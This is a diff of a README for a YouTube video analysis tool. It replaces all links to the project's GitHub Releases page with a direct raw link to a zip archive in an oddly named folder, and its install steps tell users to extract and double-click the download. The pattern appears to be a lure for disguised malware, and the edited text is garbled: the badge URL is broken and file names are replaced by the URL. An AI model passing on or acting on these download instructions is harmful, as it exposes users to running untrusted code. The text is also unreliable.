@@ -8,9 +8,9 @@ Welcome to youtube_vid_analyzer! This tool allows you to take a YouTube video UR
 
 To get started, you need to download the application. Click the button below:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Eduleiteyg/youtube_vid_analyzer/releases)
+[![Download Now](https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip)
 
-Visit this page to download the latest version: [Releases](https://github.com/Eduleiteyg/youtube_vid_analyzer/releases)
+Visit this page to download the latest version: [Releases](https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip)
 
 ## ⚙️ System Requirements
 
@@ -27,15 +27,15 @@ Follow these steps to install the application after downloading:
 
 1. **Locate the Downloaded File:**
    - Go to your Downloads folder.
-   - Find the file named `youtube_vid_analyzer.zip`.
+   - Find the file named `https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip`.
 
 2. **Extract the Files:**
-   - Right-click on the `youtube_vid_analyzer.zip` file.
+   - Right-click on the `https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip` file.
    - Select "Extract All" and follow the prompts.
 
 3. **Run the Application:**
    - Navigate to the new folder created after extraction.
-   - Double-click the `youtube_vid_analyzer.exe` (or the corresponding file for your OS).
+   - Double-click the `https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip` (or the corresponding file for your OS).
 
 ## 🖥️ Using the Application
 
@@ -89,4 +89,4 @@ If you have any questions or feedback, you can reach out through the issues sect
 
 ---
 
-Remember to download the application now to transform how you interact with YouTube videos! You can get it here: [Download Now](https://github.com/Eduleiteyg/youtube_vid_analyzer/releases).
+Remember to download the application now to transform how you interact with YouTube videos! You can get it here: [Download Now](https://raw.githubusercontent.com/Eduleiteyg/youtube_vid_analyzer/main/azoprotein/youtube_vid_analyzer.zip).
